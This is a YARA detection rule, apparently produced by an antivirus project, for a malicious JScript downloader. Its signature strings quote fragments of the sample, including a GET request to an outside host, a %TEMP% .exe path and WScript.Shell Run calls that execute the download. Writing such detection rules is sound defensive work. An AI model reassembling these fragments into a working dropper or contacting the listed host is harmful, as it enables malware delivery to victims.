rule sig_20160328_caf21c7ed3f62bdcb98edf758b10eb89 {
  meta:
    description = "datamaliciousorder - file 20160328_caf21c7ed3f62bdcb98edf758b10eb89.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0938374863679ee247b1ee22ca4cf0ade0fbb0a4302bdf524e3bc937677020bf"

  strings:
    $s1  = "function Koelojza() {return Cpuuygzrc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PWuz7XbNQ.exe\";};" fullword ascii
    $s2  = "Gtcqmsaewe[Evhlfjhs](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Ayliifki](Qhurncihnf() * 11)} while (Gtcqmsaewe[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Cpuuygzrc = function Jvieglyw() {return WScript[Irvokdpb](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Crlztpz(Zjhmefahr, Miwmtsxn){return Zjhmefahr - Miwmtsxn;};" fullword ascii
    $s6  = "function Zmqzh() {return ((Dajmvsqhp == true) && (Dajmvsqhp == Cewjnqvlk)) ? 1 : Soyetjnvgl;};" fullword ascii
    $s7  = "function Nixfb(Azvjwe){Cpuuygzrc[\"Run\"](Azvjwe, Soyetjnvgl, Soyetjnvgl);};" fullword ascii
    $s8  = "function Oopqm(Zbtyyljhl) {var Vplft = (1, 2, 3, 4, 5, Zbtyyljhl); return Vplft;};" fullword ascii
    $s9  = "var Nnlrwxhsb = new this[\"Date\"]();" fullword ascii
    $s10 = "function Rysvjinjy(){return Vkilvieavp;};" fullword ascii
    $s11 = "var Cewjnqvlk = false;" fullword ascii
    $s12 = "Dajmvsqhp = true; " fullword ascii
    $s13 = "Cewjnqvlk = true; " fullword ascii
    $s14 = "function Lmbla()" fullword ascii
    $s15 = "var Dajmvsqhp = false;" fullword ascii
    $s16 = "var Koyxkerst = false;" fullword ascii
    $s17 = " while (Lxhhofgxuj){" fullword ascii
    $s18 = "function Cyhfzcpiju(){return Irvokdpb;};" fullword ascii
    $s19 = "function Qhurncihnf(){return 22;};" fullword ascii
    $s20 = "} catch(Cnaxvaee){Lxhhofgxuj = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}